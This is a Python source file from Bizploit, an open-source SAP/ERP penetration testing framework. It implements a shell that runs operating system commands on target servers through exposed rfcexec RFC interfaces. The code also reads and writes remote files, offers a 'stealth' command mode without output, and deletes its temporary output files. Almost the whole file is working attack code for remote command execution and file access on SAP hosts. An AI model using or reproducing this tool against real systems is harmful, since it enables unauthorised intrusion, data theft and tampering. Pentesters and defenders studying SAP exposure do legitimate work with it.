# -*- coding: latin-1 -*-
'''
---------------------------------------------------------------------------
Bizploit - The Opensource ERP Penetration Testing Framework. 
Download at http://www.onapsis.com/bizploit 
--------------------------------------------------------------------------- 

@author:  Mariano Nu�ez Di Croce <mnunez@onapsis.com>    
    
Portions Copyright 2010 ONAPSIS S.R.L.
Base Copyright Mariano Nu�ez Di Croce @ CYBSEC

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
---------------------------------------------------------------------------
'''
from core.exceptions.bizploitException import bizploitException
from fwk.shells.baseShell import baseShell
import re
from core.lib.fuzzer import *
import time

class RFCEXECShell(baseShell):
	'''
	Runs operating system commands through rfcexec external RFC servers.
	'''
	def __init__( self ):
		baseShell.__init__(self)
		self._menu = {'run':self._run, 'readFile':self._readFile, 'writeFile':self._writeFile, 'runS':self._runS }
		self._cmdInter = ''
		self._sleep = 0.5
		self._deleteTmp = True
		self._fuzzer = fuzzer()

	def _onStart(self):
		self._om.console(self,'RFCEXECShell - Run commands & read files through rfcexec.')
		# Target information
		self.showTargetInfo()
	
	def showTargetInfo(self):
		
		self._info = self.getTargetInfo()
		
		if self._info['guessed']:
			self._om.information(self,'There is no information about the current target. Assuming default: ' + self._info['OSFlavour'])
		else:
			self._om.information(self,'The remote target OS is: ' + self._info['OS'] + '. ')
		
		if self._connector.getMode() == 'R':
			self._om.information(self,'Warning: You seem to be using a productive rfcexec server. By the way rfcexec is developed, if your command fails, it will probably crash. Use with caution!')
	
	def _readFile_SAPRFC_EXT(self, parameters):
		'''
		Reads files from the remote filesystem
		'''
		if len(parameters) < 1:
			self._parent._cmd_help(['readFile'])
			return 
			
		file = parameters[0]
		content = self._intReadFile(file)
		if len(content) != 0:
			self._om.information(self,'Reading file "' + file + '": ')
			self._om.information(self,'')
			for line in content:
				self._om.information(self,line.strip())
		else:
			self._om.information(self,'File "' + file + '" could not be read.')
			if self._connector.getMode() == 'R':
				self._om.information(self,'It is highly probable that rfcexec is closed now...')

	
	def _intReadFile(self, file):
		'''
		Returns a list with file values
		'''
		call = self._connector.lib.iface('RFC_REMOTE_FILE')				
		call.addParm(self._connector.lib.parm( 'FILE', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(file), 0, file))
		call.addParm(self._connector.lib.parm( 'WRITE', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, 1, 0, ' '))
		filedata = self._connector.lib.parm( 'FILEDATA', '', self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, 80*2)
		call.addParm(filedata)
		
		try:
			self._connector.connect()
			self._connector.call_receive(call)		
			self._connector.disconnect()
		except bizploitException:
			return []
			
		return filedata.value
	
	def _writeFile_SAPRFC_EXT(self, parameters):
		'''
		Writes a file, from our filesystem to remote filesystem
		'''
		if len(parameters) < 2:
			self._parent._cmd_help(['writeFile'])
			return 
		
		srcFile = parameters[0]
		dstFile = parameters[1]
		
		# Open the source file
		content = []
		try:
			fd = open( srcFile )
			for line in fd:
				content.append(line.strip())
			fd.close()
		except:
			self._om.information(self,'Failed to open source file : ' + srcFile )
			return
	
		if self._intWriteFile(content, dstFile):
			self._om.information(self,'File written successfully.')
		else:
			self._om.information(self,'Could not write file.')
			
		
	def _intWriteFile(self, content, dstFile):
		'''
		Writes a file, from our filesystem to remote filesystem
		'''
		# Obtain the maximum line length
		max = 0
		for line in content:
			if len(line) > max:
				max = len(line)
		
		call = self._connector.lib.iface('RFC_REMOTE_FILE')				
		call.addParm(self._connector.lib.parm( 'FILE', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(dstFile), 0, dstFile))
		call.addParm(self._connector.lib.parm( 'WRITE', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, 1, 0, 'X'))
		call.addParm(self._connector.lib.parm( 'FILEDATA', '', self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, max*2, 0, content))
		
		try:
			self._connector.connect()
			self._connector.call_receive(call)		
			self._connector.disconnect()
		except bizploitException:
			return False
			
		return True
	
	def _runS_SAPRFC_EXT(self, parameters):
		'''
		Runs commands on the target, in stealth mode (not file creation but no command output).
		'''
		if len(parameters) < 1:
			self._parent._cmd_help(['run'])
			return 
		
		#self._om.information(self,'Sending command...', newLine=False)	
		if self._info['OSFlavour'] == 'Windows NT':
			self._intRunCmdWin(parameters)
		else:
			self._intRunCmdUNIX(parameters)
		
		#self._om.information(self,'sent. ')	
		

	def _run_SAPRFC_EXT(self, parameters):
		'''
		Runs commands on the target, getting command output from file redirections.
		'''
		#self._om.information(self,'Sending command...')	
		if len(parameters) < 1:
			self._parent._cmd_help(['run'])
			return 
			
		if self._info['OSFlavour'] == 'Windows NT':
			self._intRunCmdWin(parameters, output=True)
		else:
			self._intRunCmdUNIX(parameters, output=True)

	
	def _intRunCmdWin(self, parameters, output = False):
		'''
		On Windows, rfcexec runs operating system commands through RFC_REMOTE_EXEC, calling to the WinExec() function.
		As we don't get command output by default, If output = True, tries to redirect command output to a temp file, read it and delete it.
		'''
		cmd = ' '.join(parameters)
		
		if output:
			tmpFile = self._info['tmpDir'] + 'bizploit_' + self._fuzzer.createRandAlpha(12)
			cmd = cmd + ' > ' + tmpFile
		
		call = self._connector.lib.iface('RFC_REMOTE_EXEC')				
		ep_cmd = self._connector.lib.parm( 'COMMAND', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmd), 0, cmd)
		call.addParm(ep_cmd)
		
		try:
			self._connector.connect()
			self._connector.call_receive(call)
			self._connector.disconnect()
		except bizploitException,  e:
			self._om.information(self,'Could not run command. ', newLine=False)
			if self._connector.getMode() == 'R':
				self._om.information(self, 'rfcexec has probably crashed!')
			else:
				self._om.information(self,'')
			self._om.debug(self,str(e))
			return 
			
		# Sleep to allow file being written
		time.sleep(self._sleep)
		
		# Try to read output file
		if output:
			content = self._intReadFile(tmpFile)
			if len(content) != 0:
				for line in content:
					self._om.information(self,line.strip())
			else:
				self._om.information(self,'Could not get command output.')
		
			# Shall we delete the file?
			if self._deleteTmp:
				self._intRunCmdWin(['del ' + tmpFile])


	def _intRunCmdUNIX(self, parameters, output=False):
		'''
		On UNIX, rfcexec runs operating system commands through RFC_REMOTE_PIPE, calling to the popenU() function.
		We have command output.
		'''
	
		cmd = ' '.join(parameters)
		
		call = self._connector.lib.iface('RFC_REMOTE_PIPE')				
		call.addParm(self._connector.lib.parm( 'COMMAND', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, len(cmd), 0, cmd))
		call.addParm(self._connector.lib.parm( 'READ', '', self._connector.lib.RFCEXPORT, self._connector.lib.RFCTYPE_CHAR, 1, 0, 'X'))
		filedata = self._connector.lib.parm( 'PIPEDATA', '', self._connector.lib.RFCTABLE, self._connector.lib.RFCTYPE_CHAR, 80*2)
		call.addParm(filedata)
		
		try:
			self._connector.connect()
			self._connector.call_receive(call)		
			self._connector.disconnect()
			#self._om.information(self,'Command was run successfully.')
		except bizploitException:
			self._om.information(self,'Could not run command.', newLine=False)
			if self._connector.getMode() == 'R':
				self._om.information(self, 'rfcexec has probably crashed!')
			else:
				self._om.information(self,'')
			return
		
		# Print command output
		for line in filedata.value:
			self._om.information(self, line.strip())
		

	def getWriteHandler(self):
		return self._intWriteFile
	
	def getCmdHandler(self):
		return self._run_SAPRFC_EXT
